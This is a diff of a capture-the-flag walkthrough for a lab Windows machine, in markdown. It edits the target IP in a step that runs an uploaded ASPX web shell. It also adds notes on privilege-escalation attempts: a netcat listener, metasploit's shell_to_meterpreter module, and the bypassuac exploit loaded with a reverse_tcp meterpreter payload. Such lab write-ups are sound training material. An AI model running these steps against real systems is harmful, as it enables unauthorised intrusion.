@@ -299,7 +299,7 @@ ftp> ls
 226 Transfer complete.
 ftp> 
 ```
-Run it by navigating to `http://10.10.10.5/shell.aspx`.
+Run it by navigating to `http://10.129.135.184/shell.aspx`.
 
 We also have netcat listening.
 ```
@@ -338,7 +338,7 @@ c:\windows\system32\inetsrv>
 ```
 
 ## 6. Privilege Escalation Failed Attempts
-Let's try somethings with metasploit.
+Let's try somethings with metasploit. First, `post/multi/manage/shell_to_meterpreter`.
 ```
 c:\windows\system32\inetsrv>background
 
@@ -368,6 +368,7 @@ msf6 post(multi/manage/shell_to_meterpreter) > run
 ```
 Nope.
 
+What about `exploit/windows/local/bypassuac`?
 ```
 msf6 > use exploit/windows/local/bypassuac
 [*] Using configured payload windows/meterpreter/reverse_tcp
